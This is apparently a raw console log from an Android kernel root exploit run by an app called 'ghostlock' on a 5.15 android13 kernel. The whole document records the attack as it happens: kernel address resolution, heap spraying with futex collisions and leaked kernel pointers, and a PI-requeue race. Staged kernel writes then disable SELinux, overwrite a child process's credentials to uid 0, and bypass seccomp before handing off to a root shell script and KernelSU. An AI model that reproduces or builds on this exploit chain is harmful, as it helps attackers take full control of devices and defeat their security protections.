[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=13804 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=259822 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=13804 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=13804 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=13804 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+174ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +226ms
[33m[*] [0m[spray] finding futex collisions... +498ms
[33m[*] [0m[spray] early collision screen 12/7 at 31%
[33m[*] [0m[spray] futex collisions found +1972ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8046ffa000 +1994ms
[33m[*] [0m[spray] payload ready +1999ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2161ms
[33m[*] [0m[T+2336ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+4346ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8046ff8108 mode=1 leaf=1
[33m[*] [0m[T+4451ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +245ms
[33m[*] [0m[spray] finding futex collisions... +484ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1976ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff885cc2d800 +2042ms
[33m[*] [0m[spray] payload ready +2046ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2215ms
[33m[*] [0m[T+6675ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+8684ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+8690ms] Write 1 complete
[33m[*] [0m[T+8897ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff89e5ee0000 (150/256 votes)
[33m[*] [0mperf task: 0xffffff89e5ee0000 (179/256 votes)
[33m[*] [0m[T+9794ms] perf_find_task done
[33m[*] [0mchild_pid=19226 child_task=0xffffff89e5ee0000
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +250ms
[33m[*] [0m[spray] finding futex collisions... +521ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1985ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff885e7bc800 +2043ms
[33m[*] [0m[spray] payload ready +2049ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2223ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff89e5ee0798 mode=2 leaf=0
[33m[*] [0m[T+12224ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +244ms
[33m[*] [0m[spray] finding futex collisions... +501ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1998ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff882434f800 +2042ms
[33m[*] [0m[spray] payload ready +2048ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2211ms
[33m[*] [0m[T+14439ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+16449ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 10510
[33m[*] [0mW2: cred attempt 2/15
[33m[*] [0mchild uid = 10510
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +251ms
[33m[*] [0m[spray] finding futex collisions... +505ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1975ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff800740fc00 +1993ms
[33m[*] [0m[spray] payload ready +2000ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2167ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff89e5ee0798 mode=2 leaf=0
[33m[*] [0m[T+19803ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +237ms
[33m[*] [0m[spray] finding futex collisions... +491ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1985ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88688b9800 +2039ms
[33m[*] [0m[spray] payload ready +2042ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2210ms
[33m[*] [0m[T+22016ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+24025ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff89e5ee0000 mode=1 leaf=1
[33m[*] [0m[T+25375ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +240ms
[33m[*] [0m[spray] finding futex collisions... +490ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1946ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff80249c8800 +1963ms
[33m[*] [0m[spray] payload ready +1971ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2138ms
[33m[*] [0m[T+27523ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+29534ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff89e5ee0860 mode=1 leaf=1
[33m[*] [0m[T+29593ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +248ms
[33m[*] [0m[spray] finding futex collisions... +508ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1991ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8946753c00 +2041ms
[33m[*] [0m[spray] payload ready +2046ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2217ms
[33m[*] [0m[T+31816ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+33823ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+35886ms] exploit complete
[33m[*] [0mhandoff: child=19226 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=5331
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
